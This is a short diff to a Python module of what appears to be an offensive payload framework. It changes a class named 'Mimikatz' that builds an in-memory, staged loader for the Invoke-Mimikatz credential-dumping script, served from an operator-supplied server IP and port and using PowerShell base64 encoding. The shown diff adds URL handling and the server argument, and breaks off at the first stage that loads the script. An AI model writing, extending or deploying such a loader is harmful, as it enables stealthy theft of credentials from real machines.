@@ -1,10 +1,16 @@
+import sys
+sys.path.append("..")
 from ressources import get_ressource_md5, powershell_encode_base64
 
 class Payload:
     name = 'Mimikatz'
+    args = ['Server_IP:Server_port']
 
     def generate_payload(self, url):
         # Mimikatz in memory in memory
+
+        if not url.startswith('http://'):
+            url = 'http://' + url
 
         # Stage1: load Invoke-Mimikatz.ps1
         pwsh_md5 = get_ressource_md5("Invoke-Mimikatz.ps1")
